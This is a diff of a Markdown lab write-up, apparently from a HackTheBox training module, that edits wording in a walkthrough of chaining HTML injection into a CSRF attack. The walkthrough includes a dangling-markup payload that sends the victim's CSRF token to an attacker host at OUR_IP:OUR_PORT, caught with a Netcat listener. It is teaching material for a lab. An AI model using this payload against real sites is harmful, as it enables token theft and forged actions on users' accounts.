@@ -28,13 +28,14 @@ The vast majority of applications nowadays perform actions through POST requests
 
 Using Burp Suite, intercept the POST request `/app/delete/our-email@htb.net`, notice that if we changed `our-email@htb.net` to `<h1>h1<u>underline<%2fu><%2fh1>` the page renders it, this shows that the web page is vulnerable to XSS attacks, with this we can chain a CSRF attack.
 
-Inspecting the source code, we can see that the injection happens before a single quote. We can now abuse this to leak the CSRF token:
+Inspecting the source code, we can see that the injection happens before a single quote:
 ```html
 ...[SNIP]...Email: <div style="color: gainsboro;"><h1>h1<u>underline</u></h1></div><input name="csrf" type="hidden" value="51a2973f01c61ec8f21e093c2d84a030d7f551d2" meta-dev='testdata' meta-dev-note="secureThisToken">
          ^ this one
 ```
+We can now abuse this to leak the CSRF token.
 
-We will now start a Netcat listener and use the following which allows us to leak the CSRF token.
+We will now start a Netcat listener and use the following request which allows us to leak the CSRF token.
 ```txt
 /app/delete/<table%20background='%2f%2fOUR_IP:OUR_PORT%2f
 ```
